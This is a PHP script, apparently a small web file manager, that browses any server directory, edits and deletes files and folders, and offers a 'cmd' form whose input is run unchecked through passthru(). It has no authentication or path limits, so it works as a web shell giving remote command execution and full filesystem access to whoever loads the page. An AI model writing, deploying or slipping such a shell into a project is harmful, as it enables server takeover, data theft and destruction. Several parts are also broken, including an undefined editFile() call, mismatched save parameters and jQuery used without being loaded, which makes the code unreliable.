<?php

/*
showToolbar
*/
function showToolbar() {
    echo '<div class="toolbar"><a href="?mode=cmd" id="btCmd">cmd</a></div>';
}

/*
****************************************************************************
showListing
****************************************************************************
*/

function showListing($dossier)
{
    $dossier = str_replace('\\','/',$dossier);
    $parent_ex = explode('/',$dossier);
    $parent = '';
    for ($i=0;$i<count($parent_ex)-2;$i++) {
        $parent .= $parent_ex[$i].'/';
    }
    //variables
    $d=array();
    $f=array();
    $nd=0;
    $nf=0;
    
    //listage des fichiers
    $hndl=opendir($dossier);
    if ($hndl) {
        while($file=readdir($hndl))
        {
            if ($file=='.' || $file=='..') continue;
            if (is_dir($dossier.$file)) {
                $d[$nd++]=$file;
            } else {
                $f[$nf++]=$file;
            }
        }
        closedir($hndl);
    }    
    //tri par ordre des dossiers et fichiers
    sort($d);
    sort($f);

    //affichage
    echo "<b>Listing of</b> ".$dossier."<hr><br>";
    echo "<table cellpadding=\"1px\" cellspacing=\"0px\">";
    echo "<tr><td><a href=\"".$_SERVER['PHP_SELF']."?dir=".$parent."\">Up</a></td><td>&nbsp;</td></tr>";
    echo "<tr><td colspan=\"3\">&nbsp;</td></tr>";
    
    for ($i=0;$i<count($d);$i++)
    {
        $dir=$d[$i];
        $chemindir=$dossier.$dir;
        $lastm=filemtime($chemindir);
        $lastm=date("d/m/Y - H:i.s", $lastm);
        $linkurl = $_SERVER['SCRIPT_NAME'].'?dir='.$dossier.$dir;
        echo '
        <tr>
            <td><a class="dir" href="'.$linkurl.'/" title="'.$lastm.' - Directory">'.$dir.'</a></td>
            <td>'.$lastm.'</td>
            <td></td>
            <td><form action="" method="post"><input type="hidden" name="rmdir" value="'.$chemindir.'"/><input type="submit" name="sub" value="delete" class="delete"/></form></td>
            <td><form action="" method="post"><input type="hidden" name="emptydir" value="'.$chemindir.'"/><input type="submit" name="sub" value="empty" class="delete"/></form></td>
        </tr>';
    }

    for ($i=0;$i<count($f);$i++)
    {
        $fichier=$f[$i];
        $cheminfichier=$dossier.$fichier;
        $taille=round(filesize($cheminfichier)/1024);
        if ($taille=="0") { $taille="< 1"; }

        $lastm=filemtime($cheminfichier);
        $lastm=date("d/m/Y - H:i.s", $lastm);
        $linkurl = rawurlencode($fichier);
        echo '
        <tr>
            <td><a class="file" href="'.$linkurl.'" title="'.$lastm.' - '.$taille.' Ko">'.$fichier.'</a></td>
            <td>'.$lastm.'</td>
            <td><a class="edit" href="'.$_SERVER['SCRIPT_NAME'].'?mode=editor&load='.$cheminfichier.'">Edit</a></td>
            <td><form action="" method="post"><input type="hidden" name="rmfile" value="'.$cheminfichier.'"/><input type="submit" name="sub" value="delete" class="delete"/></form></td>
        </tr>';
    }

    echo("</table>");

    //affiche le nombre de dossiers et fichiers
    if ($nd==1) { $nbd="y"; } else { $nbd="ies"; }
    if ($nf==1)    { $nbf=""; } else { $nbf="s"; }
    echo '<br/><hr/>'.$nd.' director'.$nbd.', '.$nf.' file'.$nbf.'<br/>';    
}

/*
****************************************************************************
showCmd
****************************************************************************
*/

function showCmd()
{
    $disp = '';
    if(isset($_POST['cmd'])) { $disp = $_POST['cmd']; }
    echo '<form action="" method="post"><input type="text" value="'.$disp.'" name="cmd"/><input type="submit" value="exec" name="exec"/></form>';
}    

/*
****************************************************************************
removeDir
****************************************************************************
*/

function removeDir($dir)
{
    if(!$dh = @opendir($dir)) return;
    while (false !== ($obj = readdir($dh)))
    {
        if($obj=='.' || $obj=='..') continue;
        if (!@unlink($dir.'/'.$obj)) removeDir($dir.'/'.$obj, true);
    }
    
    closedir($dh);
    @rmdir($dir);
    return 'dir '.$dir.' <span class="red"> deleted</span>';
}

/*
****************************************************************************
emptyDir
****************************************************************************
*/

function emptyDir($dir)
{
    if(!$dh = @opendir($dir)) return;
    while (false !== ($obj = readdir($dh)))
    {
        if($obj=='.' || $obj=='..') continue;
        if (!@unlink($dir.'/'.$obj)) removeDir($dir.'/'.$obj, true);
    }
    
    closedir($dh);
    return 'dir '.$dir.' <span class="red"> emptied</span>';
}

/*
****************************************************************************
removeFile
****************************************************************************
*/
function removeFile($file)
{
    @unlink($file);
    return 'file '.$file.' <span class="red">deleted</span>';
}


/*
****************************************************************************
editFile
****************************************************************************
*/

function editorLoadFile($file) {
    echo '<form action="" method="post"><textarea name="content">'.htmlentities(file_get_contents($file)).'</textarea>
    <input type="submit" value="Save" name="save"/></form>';
}

/*
****************************************************************************
saveFile
****************************************************************************
*/

function editorSaveFile($file,$content) {
    file_put_contents($file,$content);
    editFile($file);
}

/*
****************************************************************************
execCmd
****************************************************************************
*/

function execCmd($cmd) {
    echo '<textarea name="cmdResult">';
    passthru($cmd);
    echo '</textarea>';
}


?>

<html><head><style type="text/css">
*            { font: 100% "Courier New"; color: black; font-size:10pt;}
body        { padding:15px; background-color:#fff; margin:0; }
a            { text-decoration:none; color: #000; }
a:hover        { text-decoration:underline; }
.dir        { color:#FF8000; }
.file        { color:#004080; }
textarea    { width:100%; height:90%; }
td            { padding:0 5px 0 5px;}
form { margin:0; padding:0; }
.red        { color:red; }
.toolbar    { background-color:#eee; padding:5px;}
.toolbar a    { border:1px solid #ccc; padding:5px; display:inline-block;}
</style>

<script type="text/javascript">

    document.querySelectorAll('.delete').onclick( function() {
        if (!confirm('are you sure ?')) {
            return false;
        }
    });
    document.querySelectorAll('.edit').click(function() {
        width = 800;
        height = 500;
        var left = (window.innerWidth-width)/2;
        var top = (window.innerHeight-height)/2;
        window.open($(this).attr('href'),'edit','toolbar=no, menubar=no, scrollbars=no, resizable=no, location=no, directories=no, status=no, top='+top+', left='+left+', width='+width+', height='+height+'');
        return false;
    });
    $('#btCmd').click(function() {
        width = 800;
        height = 500;
        var left = (window.innerWidth-width)/2;
        var top = (window.innerHeight-height)/2;
        window.open($(this).attr('href'),'edit','toolbar=no, menubar=no, scrollbars=no, resizable=no, location=no, directories=no, status=no, top='+top+', left='+left+', width='+width+', height='+height+'');
        return false;
    });
</script>
</head><body>
<?php

/*
****************************************************************************
init
****************************************************************************
*/
date_default_timezone_set('Europe/Paris');
$currentdir = getcwd()."/";



/*
****************************************************************************
controller
****************************************************************************
*/    

if(!isset($_GET['mode'])) {
    $_GET['mode'] = 'fm';
}

switch ($_GET['mode']) {
    case 'fm' :
        if (isset($_GET['dir']))
        {
            $currentdir = $_GET['dir'];
        }
        if (isset($_POST['rmdir'])) {
            echo removeDir($_POST['rmdir']);
        }
        
        if (isset($_POST['emptydir'])) {
            echo emptyDir($_POST['emptydir']);
        }
        
        if (isset($_POST['rmfile'])) {
            echo removeFile($_POST['rmfile']);
        }
        
        showToolbar();
        showListing($currentdir);
        
    break;
    
    case 'editor' :
        if (isset($_GET['load']))
        {
            editorLoadFile($_GET['load']);
        }
        if (isset($_POST['save']) && isset($_POST['content']))
        {
            editorSaveFile($_GET['edit'],$_POST['content']);
        }

    break;
    
    case 'cmd' :
        showCmd();
        if (isset($_POST['cmd']))
        {
            execCmd($_POST['cmd']);
        }
    break;
    
    default :
}


?>
</body></html>
